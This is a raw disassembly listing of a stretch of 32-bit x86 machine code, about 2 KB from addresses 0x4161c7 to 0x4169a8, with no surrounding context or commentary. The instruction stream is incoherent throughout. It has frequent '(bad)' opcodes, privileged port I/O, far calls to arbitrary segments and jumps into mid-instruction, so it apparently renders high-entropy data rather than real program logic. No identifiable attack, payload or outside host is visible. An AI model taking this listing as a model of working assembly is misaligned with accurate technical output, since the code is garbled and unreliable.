  4161c7:	ja     0x416205
  4161c9:	sub    ebp,DWORD PTR [eax]
  4161cb:	pusha  
  4161cc:	mov    bl,0x21
  4161ce:	jne    0x4161e1
  4161d0:	pushf  
  4161d1:	aad    0x42
  4161d3:	into   
  4161d4:	add    cl,ch
  4161d6:	pop    ebp
  4161d7:	push   cs
  4161d8:	xchg   esi,eax
  4161d9:	lds    esp,FWORD PTR [eax]
  4161db:	jbe    0x41623c
  4161dd:	pop    ecx
  4161de:	out    dx,al
  4161df:	dec    edi
  4161e0:	loopne 0x4161cd
  4161e2:	addr16 push 0x3e3e93de
  4161e8:	fwait
  4161e9:	xchg   ebx,eax
  4161ea:	daa    
  4161eb:	lods   al,BYTE PTR ds:[esi]
  4161ec:	xor    al,0xdb
  4161ee:	pop    ebx
  4161ef:	mov    ah,0x92
  4161f1:	bound  edx,QWORD PTR [ebp-0xb]
  4161f4:	sbb    BYTE PTR [ecx-0x39fc90c2],0x25
  4161fb:	dec    dh
  4161fd:	out    dx,al
  4161fe:	push   0x66
  416200:	mov    ds:0xca8f83ca,al
  416205:	sub    BYTE PTR [edi+esi*4],cl
  416208:	push   ecx
  416209:	pop    esi
  41620a:	pop    edx
  41620b:	mov    cl,0x8b
  41620d:	mov    dl,0xcf
  41620f:	mov    ecx,0x31ff68ac
  416214:	jmp    DWORD PTR [eax-0x7c8157b8]
  41621a:	xor    eax,DWORD PTR fs:[edi-0x57]
  41621e:	fidiv  DWORD PTR [esi+ecx*1+0x6651b83e]
  416225:	cmp    eax,0xa52890e0
  41622a:	call   0x1610:0x5c7fab4b
  416231:	sahf   
  416232:	call   0xa942:0xd9725f30
  416239:	out    dx,eax
  41623a:	inc    ebx
  41623b:	aaa    
  41623c:	ins    BYTE PTR es:[edi],dx
  41623d:	mov    ebp,0x19dbbced
  416242:	lods   al,BYTE PTR ds:[esi]
  416243:	test   al,0xc5
  416245:	pop    esi
  416246:	enter  0x68d1,0xe0
  41624a:	nop
  41624b:	pop    ds
  41624c:	xchg   esi,eax
  41624d:	fchs   
  41624f:	ds clc 
  416251:	dec    edi
  416252:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416253:	push   ecx
  416254:	lahf   
  416255:	in     al,dx
  416256:	xor    DWORD PTR [edi+0x79],ecx
  416259:	lods   al,BYTE PTR ds:[esi]
  41625a:	adc    BYTE PTR [ecx+0x70],dl
  41625d:	inc    edx
  41625e:	push   esp
  41625f:	call   0xb596:0xdfbb0738
  416266:	fs dec ebx
  416268:	js     0x416256
  41626a:	jnp    0x41621a
  41626c:	fisubr DWORD PTR [eax]
  41626e:	ins    DWORD PTR es:[edi],dx
  41626f:	ss and al,0x47
  416272:	sahf   
  416273:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  416275:	sbb    BYTE PTR [esi],bl
  416277:	je     0x416257
  416279:	adc    esp,esp
  41627b:	jl     0x416259
  41627d:	rcr    DWORD PTR [esi+0x32],cl
  416280:	pop    edi
  416281:	add    ebp,DWORD PTR [ecx+ecx*4-0x42]
  416285:	rcl    dl,1
  416287:	rol    al,1
  416289:	xchg   esi,eax
  41628a:	push   esp
  41628b:	pop    ss
  41628c:	dec    esp
  41628d:	jne    0x416279
  41628f:	push   0x1a
  416291:	addr16 nop
  416293:	dec    ebp
  416294:	sub    DWORD PTR [ebx],eax
  416296:	jnp    0x4162bc
  416298:	mov    esi,DWORD PTR [eax+0x54]
  41629b:	mov    bl,0x75
  41629d:	xor    eax,0x68e4dae7
  4162a2:	mov    dl,0x25
  4162a4:	fwait
  4162a5:	sbb    ebx,0xd215aa10
  4162ab:	mov    ecx,DWORD PTR [edi+0x23413fd3]
  4162b1:	fmul   DWORD PTR [edi+eiz*2-0x5f0aa4d7]
  4162b8:	scas   al,BYTE PTR es:[edi]
  4162b9:	lods   al,BYTE PTR ds:[esi]
  4162ba:	scas   eax,DWORD PTR es:[edi]
  4162bb:	enter  0x30f,0x75
  4162bf:	shr    esp,0x15
  4162c2:	jns    0x41629b
  4162c4:	mov    al,0x93
  4162c6:	sbb    cl,BYTE PTR fs:[edx+0x552e8903]
  4162cd:	repz push ecx
  4162cf:	icebp  
  4162d0:	data16 lahf 
  4162d2:	jns    0x41630c
  4162d4:	out    dx,al
  4162d5:	and    BYTE PTR [ebx-0x54],0x82
  4162d9:	push   cs
  4162da:	cmp    ecx,DWORD PTR [ecx]
  4162dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4162dd:	cmp    al,bl
  4162df:	pop    esi
  4162e0:	repnz cli 
  4162e2:	jmp    0x416337
  4162e4:	jl     0x4162f6
  4162e6:	jbe    0x4162fd
  4162e8:	sub    DWORD PTR [ebp+0x6ab6e704],0xffffffba
  4162ef:	dec    ebx
  4162f0:	dec    ebp
  4162f1:	aam    0x94
  4162f3:	outs   dx,BYTE PTR ds:[esi]
  4162f4:	jl     0x41628f
  4162f6:	add    DWORD PTR [ebp+0x5],esi
  4162f9:	dec    ebp
  4162fa:	push   0x320df0ef
  4162ff:	sbb    dl,BYTE PTR [eax]
  416301:	add    ch,ah
  416303:	(bad)  
  416306:	and    DWORD PTR [ecx],eax
  416308:	mov    bh,0xda
  41630a:	arpl   WORD PTR [edi-0x48],di
  41630d:	push   0x52
  41630f:	push   es
  416310:	xor    edi,0x42a4eeaa
  416316:	xchg   edi,eax
  416317:	adc    DWORD PTR [eax-0x6a],esp
  41631a:	and    eax,0x79e2dabc
  41631f:	add    eax,0x8ed9ca57
  416324:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416325:	sbb    DWORD PTR [ecx+0x6c2132b0],0xd8d6a779
  41632f:	xor    esp,ebp
  416331:	and    al,0x4e
  416333:	repz mov eax,edx
  416336:	std    
  416337:	mov    DWORD PTR [ecx],ebp
  416339:	fisttp QWORD PTR [edx+0x21]
  41633c:	push   ebp
  41633d:	dec    edi
  41633e:	test   DWORD PTR ds:0x706ec3a5,ebp
  416344:	les    eax,FWORD PTR [edi+esi*1]
  416347:	pop    ebx
  416348:	mov    esp,0x71b1271e
  41634d:	stos   DWORD PTR es:[edi],eax
  41634e:	push   0x30
  416350:	jle    0x41631f
  416352:	(bad)  
  416353:	rcr    BYTE PTR [edx],1
  416355:	ins    DWORD PTR es:[edi],dx
  416356:	mov    esi,0xb535694e
  41635b:	out    0xf7,al
  41635d:	cli    
  41635e:	int3   
  41635f:	xor    eax,DWORD PTR [ebp-0x5c]
  416362:	iret   
  416363:	and    cl,dh
  416365:	mov    ebx,0x30e09610
  41636a:	add    DWORD PTR [esi],esp
  41636c:	push   eax
  41636d:	into   
  41636e:	cs pop esi
  416370:	sub    BYTE PTR [eax+0x28fff331],0x4f
  416377:	mov    dh,0xb4
  416379:	ss mov dh,0x61
  41637c:	or     dl,0xd4
  41637f:	lea    eax,[ebx-0x40ad7714]
  416385:	xor    esi,ecx
  416387:	outs   dx,DWORD PTR ds:[esi]
  416388:	mov    edi,0xd750dcab
  41638d:	sbb    BYTE PTR [edx],dl
  41638f:	ins    DWORD PTR es:[edi],dx
  416390:	nop
  416391:	sar    DWORD PTR [ebx+0x324ac934],1
  416397:	dec    ebx
  416398:	icebp  
  416399:	jb     0x4163f9
  41639b:	push   ecx
  41639c:	repz xor eax,0xb1e9e95b
  4163a2:	ds mov esp,0xf086bd3f
  4163a8:	sar    al,1
  4163aa:	pop    ebx
  4163ab:	out    dx,eax
  4163ac:	loope  0x416386
  4163ae:	jno    0x4163d0
  4163b0:	nop
  4163b1:	cmp    DWORD PTR [esi-0x6a7c1f4],ebx
  4163b7:	les    ebx,FWORD PTR [edx+0x42]
  4163ba:	imul   esp,DWORD PTR [edi],0x4d
  4163bd:	jg     0x416358
  4163bf:	inc    ebp
  4163c0:	xlat   BYTE PTR ds:[ebx]
  4163c1:	add    edi,eax
  4163c3:	jo     0x4163f0
  4163c5:	xchg   edx,eax
  4163c6:	js     0x41637e
  4163c8:	pop    edx
  4163c9:	lea    esi,[esi]
  4163cb:	xchg   ebp,eax
  4163cc:	std    
  4163cd:	test   al,0x73
  4163cf:	aam    0xd7
  4163d1:	cmp    DWORD PTR [eax+0x3],esi
  4163d4:	(bad)  
  4163d5:	cli    
  4163d6:	add    BYTE PTR [esi+0x6f9c21bf],dl
  4163dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4163dd:	jl     0x4163d9
  4163df:	xchg   esp,eax
  4163e0:	xor    ebp,esp
  4163e2:	fnsave ds:0xcc998212
  4163e8:	sub    DWORD PTR [eax],0xffffff9f
  4163eb:	xchg   BYTE PTR [edi+0x53],al
  4163ee:	lds    eax,FWORD PTR [ebx-0x7cca32a5]
  4163f4:	xchg   BYTE PTR [edx+0x51],bh
  4163f7:	push   DWORD PTR [eax+eax*1+0x9]
  4163fb:	push   esi
  4163fc:	retf   0x72aa
  4163ff:	or     esp,DWORD PTR [edi+edi*4]
  416402:	call   0x523e:0x37740cf9
  416409:	or     eax,0x5f1c729d
  41640e:	repnz aad 0x43
  416411:	jbe    0x416410
  416413:	or     DWORD PTR [edi+0x84f268f],esp
  416419:	leave  
  41641a:	ja     0x416436
  41641c:	add    cl,ch
  41641e:	xchg   DWORD PTR [ebx-0x16],esi
  416421:	das    
  416422:	ds mov ecx,0x1c1ec05b
  416428:	cs js  0x4163ac
  41642b:	push   esi
  41642c:	mov    eax,ds:0xe5ca4baa
  416431:	dec    edx
  416432:	(bad)  
  416433:	xor    BYTE PTR [ebp+0x13],ch
  416436:	int    0x4f
  416438:	rcr    BYTE PTR [ecx-0x6b],0x8b
  41643c:	int3   
  41643d:	outs   dx,DWORD PTR ds:[esi]
  41643e:	push   0x9ffe7ad5
  416443:	inc    esp
  416444:	mov    ebx,DWORD PTR [ecx-0x1e]
  416447:	repnz sbb ecx,DWORD PTR [ebx]
  41644a:	xchg   edi,eax
  41644b:	xchg   edi,eax
  41644c:	push   0x33
  41644e:	mov    ds:0x6316ce99,eax
  416453:	cdq    
  416454:	les    edx,FWORD PTR [ebp+0x5dfe8d49]
  41645a:	pop    eax
  41645b:	test   DWORD PTR [ebx],ecx
  41645d:	push   cs
  41645e:	pop    edi
  416460:	add    edi,DWORD PTR [ebp+0x3b]
  416463:	mov    ah,0x9a
  416465:	mov    esi,0xf0de4be1
  41646a:	iret   
  41646b:	or     al,0x28
  41646d:	pop    ebp
  41646e:	pop    DWORD PTR [edx-0x43]
  416471:	sub    eax,0x4d467680
  416476:	out    0x1c,al
  416478:	test   DWORD PTR [edi+ecx*8+0x32f71327],edi
  41647f:	aaa    
  416480:	(bad)  
  416481:	or     bl,BYTE PTR [ebp-0x51]
  416484:	fcomip st,st(3)
  416486:	dec    esi
  416487:	inc    eax
  416488:	nop
  416489:	and    edx,DWORD PTR fs:[ebp-0x3]
  41648d:	add    DWORD PTR [esi],edi
  41648f:	xchg   edx,eax
  416490:	add    BYTE PTR [edx],ch
  416492:	push   0xbec4520b
  416497:	in     eax,0x78
  416499:	jae    0x4164b6
  41649b:	in     eax,0x86
  41649d:	sub    bl,BYTE PTR [eax]
  41649f:	(bad)  
  4164a0:	xor    ah,BYTE PTR [esi]
  4164a2:	cmp    DWORD PTR ds:0x6d78f99,edi
  4164a8:	push   0x10f79ac0
  4164ad:	sbb    esi,DWORD PTR [ecx-0x62]
  4164b0:	mov    dl,0xde
  4164b2:	(bad)  
  4164b3:	scas   al,BYTE PTR es:[edi]
  4164b4:	fstp   TBYTE PTR [esi-0x60dce079]
  4164ba:	daa    
  4164bb:	mov    al,ds:0x326e4bd
  4164c0:	mov    dh,0x99
  4164c2:	fdivr  st,st(1)
  4164c4:	(bad)  
  4164c5:	mov    dl,0x66
  4164c7:	fstp   QWORD PTR [eax]
  4164c9:	sub    esi,eax
  4164cb:	dec    edi
  4164cc:	push   cs
  4164cd:	int    0xc7
  4164cf:	mov    bl,BYTE PTR [ebx+eax*8]
  4164d2:	jae    0x41651b
  4164d4:	test   eax,0xcab8e48f
  4164d9:	cli    
  4164da:	lahf   
  4164db:	dec    esp
  4164dc:	fisubr WORD PTR [esi+0x7b]
  4164df:	pop    es
  4164e0:	and    eax,0x9dd5e1b6
  4164e5:	shl    BYTE PTR [ecx-0x393db3bf],1
  4164eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4164ec:	xchg   BYTE PTR ds:0xfa9777b7,bl
  4164f2:	fld    st(5)
  4164f4:	adc    esi,DWORD PTR [edx]
  4164f6:	ins    BYTE PTR es:[edi],dx
  4164f7:	call   0x7de9e2c
  4164fc:	dec    ecx
  4164fd:	add    ecx,0xf5fe4517
  416503:	pop    eax
  416504:	jmp    0x41653f
  416506:	mov    ch,BYTE PTR [ebx-0x40]
  416509:	addr16 fwait
  41650b:	xchg   BYTE PTR [edx],al
  41650d:	and    eax,DWORD PTR [ebp-0x770460e0]
  416513:	cmp    ch,0x3e
  416516:	jge    0x41650d
  416518:	stos   BYTE PTR es:[edi],al
  416519:	fdiv   QWORD PTR [ebx]
  41651b:	in     eax,dx
  41651c:	shl    DWORD PTR [edx],0xc
  41651f:	push   edx
  416520:	int    0x20
  416522:	xchg   ebp,eax
  416523:	sub    BYTE PTR [edi],bl
  416525:	mov    edi,0xd7a87f3d
  41652a:	fisub  DWORD PTR [esi+eiz*1-0x88a9985]
  416531:	stos   DWORD PTR es:[edi],eax
  416532:	push   es
  416533:	bound  esp,QWORD PTR [esi-0x33]
  416536:	fnsave [ecx+0x66e89941]
  41653c:	mov    al,ds:0x13f434c5
  416541:	gs pop ecx
  416543:	xchg   ebx,eax
  416544:	pop    edx
  416545:	sub    al,0x59
  416547:	pop    ss
  416548:	dec    edx
  416549:	in     eax,dx
  41654a:	addr16 (bad) 
  41654c:	jmp    0x416535
  41654e:	fld    TBYTE PTR [ecx-0x69]
  416551:	adc    eax,0x9765a05e
  416556:	push   eax
  416557:	xor    DWORD PTR [ecx],0xffffffe7
  41655a:	dec    ecx
  41655b:	xor    BYTE PTR [eax+0x0],al
  416561:	add    al,bh
  416563:	pminsw mm6,QWORD PTR [edi-0x1]
  416567:	idiv   ebp
  416569:	(bad)  
  41656a:	repz push esi
  41656c:	retf   0xf5f1
  41656f:	fs retf 
  416571:	jo     0x4165c5
  416573:	jecxz  0x416575
  416575:	add    bl,dh
  416577:	add    al,0x0
  416579:	add    BYTE PTR [eax+eiz*2-0x7b],ch
  41657d:	xor    ebp,DWORD PTR [edi-0x2a568597]
  416583:	(bad)  
  416585:	(bad)  
  416586:	mov    ds:0xb0f0bdde,eax
  41658b:	push   ebx
  41658c:	mov    ch,0xfd
  41658e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41658f:	call   0xed09:0x1dc59b04
  416596:	mov    bh,ah
  416598:	pop    es
  416599:	dec    ebp
  41659a:	cwde   
  41659b:	fs cmc 
  41659d:	add    al,0x7c
  41659f:	ficom  DWORD PTR [ecx+edi*1]
  4165a2:	daa    
  4165a3:	dec    esi
  4165a4:	dec    ebp
  4165a5:	daa    
  4165a6:	sbb    DWORD PTR cs:[esi-0x4e67d032],ebp
  4165ad:	push   cs
  4165ae:	daa    
  4165af:	push   ecx
  4165b0:	(bad)  
  4165b1:	daa    
  4165b2:	mov    eax,ds:0xe6a9aba6
  4165b7:	std    
  4165b8:	fstp   DWORD PTR [edi-0x6]
  4165bb:	aam    0x93
  4165bd:	mov    eax,0xbabdf493
  4165c2:	dec    ebp
  4165c3:	mov    ecx,0xfe03fd3e
  4165c8:	pop    edi
  4165c9:	loop   0x4165ea
  4165cb:	lods   al,BYTE PTR ds:[esi]
  4165cc:	xchg   DWORD PTR [esi-0x24],ebx
  4165cf:	inc    esi
  4165d0:	(bad)  
  4165d3:	jbe    0x416576
  4165d5:	mov    esp,gs
  4165d7:	aam    0xf1
  4165d9:	pop    ecx
  4165da:	xor    eax,0x20b98416
  4165df:	xchg   ecx,eax
  4165e0:	repnz ins BYTE PTR es:[edi],dx
  4165e2:	sbb    dl,BYTE PTR [ebx-0x7c7c975b]
  4165e8:	pop    ebp
  4165e9:	xor    al,0x1e
  4165eb:	into   
  4165ec:	repnz nop
  4165ee:	call   0x8ab7:0xb9a7e457
  4165f5:	xchg   ebp,eax
  4165f6:	je     0x4165d8
  4165f8:	sbb    DWORD PTR [ebx+0x2e],0x8680f63
  4165ff:	lods   al,BYTE PTR ds:[esi]
  416600:	jns    0x4165fd
  416602:	cdq    
  416603:	xchg   edi,eax
  416604:	std    
  416605:	sbb    eax,0xd923276f
  41660a:	imul   esi,edx,0xf3630df6
  416610:	lahf   
  416611:	mov    ah,0x9e
  416613:	xchg   ebp,eax
  416614:	jb     0x416631
  416616:	call   0xa07d:0x90c38794
  41661d:	sbb    eax,0xffffff92
  416620:	mov    al,0x61
  416622:	add    dh,BYTE PTR [ecx]
  416624:	stos   BYTE PTR es:[edi],al
  416625:	jmp    0x36ba:0xf4c3493d
  41662c:	sahf   
  41662d:	inc    ebp
  41662e:	pop    edx
  41662f:	pop    ebp
  416630:	or     al,0xd1
  416632:	push   edx
  416633:	dec    esi
  416634:	cs cmp esi,eax
  416637:	jle    0x4166a2
  416639:	sahf   
  41663a:	arpl   WORD PTR [ebx+0x3a],si
  41663d:	or     bl,BYTE PTR [ebp+0x4dfbdd2c]
  416643:	lds    edx,FWORD PTR [ecx+ebx*1-0x4cd2a5f8]
  41664a:	(bad)  
  41664b:	in     eax,0xe6
  41664d:	ds dec esi
  41664f:	sbb    ch,BYTE PTR [edx-0x7d7261ae]
  416655:	cmp    dh,BYTE PTR gs:[ecx]
  416658:	aas    
  416659:	addr16 mov dh,0x94
  41665c:	sar    dh,cl
  41665e:	add    DWORD PTR [edx+0x3a],esi
  416661:	les    ebp,FWORD PTR ds:0xd71aa849
  416667:	mov    al,0x45
  416669:	fcom   DWORD PTR [edx+0x25]
  41666c:	inc    ebx
  41666d:	(bad)  
  41666e:	push   ebp
  41666f:	jp     0x4166b9
  416671:	sub    eax,0xfb88c161
  416676:	jmp    0x6733:0x865620a8
  41667d:	push   eax
  41667e:	jne    0x4166bb
  416680:	add    esp,ebx
  416682:	clc    
  416683:	add    ecx,DWORD PTR [ebx-0x46]
  416686:	arpl   WORD PTR [esi+0x3a],di
  416689:	mov    edi,0x83c81dd2
  41668e:	xchg   edx,eax
  41668f:	mov    bh,0x69
  416691:	push   ebp
  416692:	imul   esi,DWORD PTR [edi+0x5a],0x105a9847
  416699:	clc    
  41669a:	mov    eax,0xe5ef0aac
  41669f:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  4166a1:	inc    DWORD PTR [ebx]
  4166a3:	ja     0x4166a8
  4166a5:	xor    cl,BYTE PTR [eax+edx*1-0x1c]
  4166a9:	xchg   ah,bh
  4166ab:	push   ds
  4166ac:	push   edx
  4166ad:	sub    eax,0xaebd6646
  4166b2:	and    esp,ecx
  4166b4:	adc    BYTE PTR [ebx+0x3e],al
  4166b7:	sbb    ebx,DWORD PTR ds:0x9feed0b0
  4166bd:	pop    edx
  4166be:	in     al,0xde
  4166c0:	js     0x4166ad
  4166c2:	mov    bh,dl
  4166c4:	pop    esi
  4166c5:	aam    0xa6
  4166c7:	and    DWORD PTR [edi+eax*8+0x14],esi
  4166cb:	aad    0x7b
  4166cd:	arpl   bp,di
  4166cf:	push   eax
  4166d0:	ror    DWORD PTR ds:0x6a44e52c,0x5a
  4166d7:	outs   dx,BYTE PTR ds:[esi]
  4166d8:	dec    ecx
  4166d9:	fistp  QWORD PTR [edx-0xa5cbbe5]
  4166df:	pusha  
  4166e0:	retf   
  4166e1:	xor    bh,BYTE PTR [edi+0x20]
  4166e4:	xor    edi,0x76845b98
  4166ea:	addr16 cli 
  4166ec:	xchg   DWORD PTR [edi-0x29],esi
  4166ef:	jae    0x416713
  4166f1:	push   cs
  4166f2:	inc    eax
  4166f3:	ds adc eax,0x1fba399c
  4166f9:	into   
  4166fa:	mov    cs,WORD PTR [edi]
  4166fc:	xchg   BYTE PTR [eax-0x1a],dl
  4166ff:	and    al,0xa8
  416701:	retf   
  416702:	ficom  DWORD PTR [edx]
  416704:	sar    DWORD PTR [eax-0x2b],cl
  416707:	in     eax,0xfb
  416709:	add    dl,cl
  41670b:	aas    
  41670c:	(bad)  
  41670d:	data16 aas 
  41670f:	(bad)  
  416711:	mov    dl,0xc1
  416713:	in     al,0xba
  416715:	inc    ebp
  416716:	fs inc ebp
  416718:	sbb    esp,DWORD PTR [ecx+eax*4-0xc99cb21]
  41671f:	xor    DWORD PTR [eax+0x38568a08],edi
  416725:	retf   
  416726:	jns    0x4166df
  416728:	mov    esi,DWORD PTR [ebx+0x78]
  41672b:	cmp    BYTE PTR [edi-0x29],dl
  41672e:	mov    eax,ds:0xd3813359
  416733:	es mov ecx,0x7a65d687
  416739:	dec    eax
  41673a:	xor    edx,DWORD PTR [ebp+0x61]
  41673d:	in     al,0x56
  41673f:	add    BYTE PTR [eax-0x61],dl
  416742:	push   ds
  416743:	or     ecx,DWORD PTR gs:[esi+0x1a9f4973]
  41674a:	sub    DWORD PTR [esi-0x3df56aeb],ecx
  416750:	or     ecx,esp
  416752:	lods   al,BYTE PTR ds:[esi]
  416753:	mov    cl,BYTE PTR [esi+edx*1+0x589523d6]
  41675a:	mov    ebp,0xb52215d7
  41675f:	mov    ebx,0x10f1cd56
  416764:	dec    ecx
  416765:	dec    esi
  416766:	les    ecx,FWORD PTR [edi]
  416768:	(bad)  
  416769:	mov    ebx,0xf09b930d
  41676e:	iret   
  41676f:	pop    esi
  416770:	bound  edi,QWORD PTR [ecx-0x7]
  416773:	dec    edi
  416774:	xchg   ebp,eax
  416775:	push   0x20b4023e
  41677a:	pop    esi
  41677b:	xor    eax,0x9303583
  416780:	and    ah,BYTE PTR [edx-0x24a058b5]
  416786:	(bad)  
  416787:	out    0x80,al
  416789:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41678a:	arpl   WORD PTR ds:0xc4763693,cx
  416790:	jge    0x41676c
  416792:	lock push ebp
  416794:	pop    ss
  416795:	jp     0x41673f
  416797:	sub    DWORD PTR [ebx],0x596a59be
  41679d:	xchg   ebx,eax
  41679e:	out    0x9b,eax
  4167a0:	in     eax,0x2
  4167a2:	cmp    eax,0xe7020b0e
  4167a7:	ds popa 
  4167a9:	gs mov cl,0x3d
  4167ac:	sbb    al,bl
  4167ae:	xchg   esi,eax
  4167af:	jge    0x416747
  4167b1:	jnp    0x41680b
  4167b3:	mov    dl,0x6a
  4167b5:	arpl   di,ax
  4167b7:	xchg   esp,eax
  4167b8:	cmp    al,0x16
  4167ba:	add    al,0x51
  4167bc:	cmc    
  4167bd:	retf   
  4167be:	test   eax,0x6d4e322
  4167c3:	or     eax,0x4b4648ed
  4167c8:	stc    
  4167c9:	cmp    al,0xee
  4167cb:	xor    eax,0xbc6d3a63
  4167d0:	inc    ebx
  4167d1:	int    0xf0
  4167d3:	xchg   BYTE PTR [eiz*8+0x28591fd],dh
  4167da:	or     DWORD PTR [ebx+0x295ee001],esp
  4167e0:	dec    edx
  4167e1:	pop    edi
  4167e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4167e3:	jnp    0x416769
  4167e5:	jns    0x41679c
  4167e7:	jle    0x41680b
  4167e9:	ins    BYTE PTR es:[edi],dx
  4167ea:	add    ebp,0x6
  4167ed:	loop   0x4167d1
  4167ef:	inc    esi
  4167f0:	and    dl,BYTE PTR [ebx]
  4167f2:	xchg   edx,eax
  4167f3:	jge    0x41681f
  4167f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4167f6:	push   esp
  4167f7:	add    BYTE PTR [ebx],bh
  4167f9:	adc    dl,ch
  4167fb:	pop    bp
  4167fd:	pop    edx
  4167fe:	stos   DWORD PTR es:[edi],eax
  4167ff:	test   DWORD PTR [eax-0x1d],edi
  416802:	mov    ds:0xd3c067ba,al
  416807:	jb     0x416867
  416809:	mov    esp,0x82f72bba
  41680e:	adc    BYTE PTR [edi],ch
  416810:	addr16 mov ah,0xb
  416813:	and    esi,DWORD PTR gs:[esi]
  416816:	lods   al,BYTE PTR ds:[esi]
  416817:	fsubr  QWORD PTR [esi-0x1fb908f0]
  41681d:	jge    0x4167e3
  41681f:	outs   dx,BYTE PTR ds:[esi]
  416820:	push   0x48cee0c9
  416825:	fmul   st(7),st
  416827:	sub    DWORD PTR [esi+0x58],esp
  41682a:	ss dec edi
  41682c:	mov    cl,0x6f
  41682e:	pusha  
  41682f:	sub    al,0x18
  416831:	xchg   edi,eax
  416832:	mov    edi,0xb3372c7a
  416837:	shr    BYTE PTR [ebx-0xb3cce2f],1
  41683d:	jno    0x41689b
  41683f:	push   eax
  416840:	sbb    al,0x24
  416842:	jmp    0x41688d
  416844:	bnd jnp 0x416842
  416847:	jmp    0xfbedab24
  41684c:	mov    bh,0xdc
  41684e:	rcr    eax,0xce
  416851:	jl     0x41687f
  416853:	mov    edi,0x5a526eea
  416858:	sub    eax,0x6b74976
  41685d:	ja     0x41689c
  41685f:	lods   eax,DWORD PTR ds:[esi]
  416860:	sar    dh,0x46
  416863:	pop    ebp
  416864:	test   BYTE PTR [ecx+0x7b],0x0
  416868:	imul   ecx,eax,0xd9edc171
  41686e:	jmp    0xd7e8:0xc9ffdddc
  416875:	hlt    
  416876:	sub    al,0x26
  416878:	scas   eax,DWORD PTR es:[edi]
  416879:	mov    dl,0x81
  41687b:	fs sub ebp,eax
  41687e:	cmp    eax,0xed7c44b0
  416883:	inc    eax
  416884:	sub    al,0xc7
  416886:	ficom  WORD PTR [edi-0x204fd7d2]
  41688c:	std    
  41688d:	repnz inc ebx
  41688f:	xchg   edx,esp
  416891:	and    eax,0x7069735
  416896:	cli    
  416897:	ja     0x416900
  416899:	ins    BYTE PTR es:[edi],dx
  41689a:	push   edi
  41689b:	ja     0x4168f4
  41689d:	int    0xe8
  41689f:	pusha  
  4168a0:	push   esp
  4168a1:	outs   dx,DWORD PTR ds:[esi]
  4168a2:	mov    ch,BYTE PTR [ebp+0x48ce035c]
  4168a8:	call   0x584:0xa83dc9e3
  4168af:	cwde   
  4168b0:	mov    WORD PTR [ebp-0x70],?
  4168b3:	inc    esp
  4168b4:	mov    edx,0x31786fc4
  4168b9:	mov    ebx,gs
  4168bb:	nop
  4168bc:	retf   0x504a
  4168bf:	adc    bl,BYTE PTR [eax]
  4168c1:	cmp    ecx,ebp
  4168c3:	xor    cl,BYTE PTR [ecx]
  4168c5:	cli    
  4168c6:	or     al,0xc
  4168c8:	sbb    BYTE PTR [esi-0x79c68b89],al
  4168ce:	dec    edx
  4168cf:	push   edi
  4168d0:	test   BYTE PTR [edi+edi*1-0xbb72d90],0x8d
  4168d8:	(bad)  
  4168d9:	loopne 0x41689c
  4168db:	xchg   esi,eax
  4168dc:	out    0x28,eax
  4168de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4168df:	repnz cli 
  4168e1:	adc    eax,0x489f2fc1
  4168e6:	(bad)  
  4168e7:	jmp    0xee61af1e
  4168ec:	and    eax,0x2823166f
  4168f1:	xlat   BYTE PTR ds:[ebx]
  4168f2:	clc    
  4168f3:	push   eax
  4168f4:	mov    esp,0xd9b123f6
  4168f9:	dec    edi
  4168fa:	(bad)
  4168fe:	sub    DWORD PTR [edi-0x22],eax
  416901:	cmp    BYTE PTR [ecx+ebp*4-0x73],0x15
  416906:	(bad)  
  416907:	pop    DWORD PTR [esi-0xa]
  41690a:	add    al,0x93
  41690c:	addr16 ffree st(2)
  41690f:	mov    esp,gs
  416911:	dec    edi
  416912:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416913:	xchg   edi,eax
  416914:	daa    
  416915:	or     dl,al
  416917:	xchg   DWORD PTR [esi-0x5e11e7a3],edi
  41691d:	inc    eax
  41691e:	ret    
  41691f:	sub    ch,al
  416921:	cmp    DWORD PTR [esi+0x4a],eax
  416924:	inc    esi
  416925:	sbb    BYTE PTR [edx-0x6b2bdd44],0x9b
  41692c:	jnp    0x4168c2
  41692e:	mov    ecx,0x6d58525b
  416933:	pop    ss
  416934:	pop    ebx
  416935:	daa    
  416936:	jmp    0xcb47:0xcdc8e4f
  41693d:	jl     0x4168fe
  41693f:	sub    al,0x20
  416941:	adc    ebp,DWORD PTR [ecx]
  416943:	and    BYTE PTR [edx+0x564a2b68],bh
  416949:	jecxz  0x41698e
  41694b:	inc    edx
  41694c:	pop    ss
  41694d:	and    al,0xff
  41694f:	popf   
  416950:	mov    bh,0xaa
  416952:	rcr    ch,1
  416954:	inc    ebp
  416955:	xor    eax,0xa65a2182
  41695a:	(bad)  
  41695b:	lds    esp,FWORD PTR [esi+0x42]
  41695e:	(bad)  
  41695f:	mov    al,ds:0x54fa1eb2
  416964:	jmp    DWORD PTR [esi+ebx*2-0x45]
  416968:	mov    eax,ds:0x2f15d518
  41696d:	icebp  
  41696e:	push   esi
  41696f:	loop   0x4169bf
  416971:	repz mov ds:0x2c82903c,al
  416977:	inc    esi
  416978:	inc    esi
  416979:	pop    eax
  41697a:	and    al,0xec
  41697c:	ss pop ss
  41697e:	lea    edx,[eax]
  416980:	and    BYTE PTR [eax-0x6e],0x92
  416984:	ror    esp,cl
  416986:	inc    ebp
  416987:	jne    0x4169c8
  416989:	(bad)  
  41698a:	ds mov ecx,0xebe4469d
  416990:	pop    esp
  416991:	out    dx,eax
  416992:	adc    dh,BYTE PTR [edi+edx*8-0x45]
  416996:	add    DWORD PTR [ecx],eax
  416998:	xchg   edx,eax
  416999:	or     bl,cl
  41699b:	or     al,0x7c
  41699d:	jmp    0xd22dc19e
  4169a2:	dec    ebx
  4169a3:	cld    
  4169a4:	sbb    ah,ah
  4169a6:	push   edi
  4169a7:	pop    esi
  4169a8:	and    eax,DWORD PTR [ebp+0x9192382]
